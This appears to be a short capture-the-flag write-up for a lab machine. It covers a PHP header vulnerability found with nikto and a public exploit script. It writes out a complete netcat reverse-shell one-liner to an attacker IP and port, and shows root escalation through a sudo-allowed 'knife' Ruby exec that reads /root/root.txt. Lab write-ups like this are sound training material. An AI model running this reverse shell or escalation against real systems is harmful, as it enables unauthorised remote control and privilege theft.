ip = 10.10.10.242

nikto found a vuln in one of the php headers, after googling this, we found an exploit script (see the python file) that allows us to send commands.

this command:
rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.193 9999 >/tmp/f
Is the useable reverse shell, which allows for better access.

I discovered that the user can run the "Knife" command as Sudo, and after looking at the packages for this command, I saw that it was ruby, and has an option to execute a script via the 'exec' option.  Executing the below code gets root.


f = File.open(“/root/root.txt”, “r”)
f.each_line do |line|
puts line
end
f.close
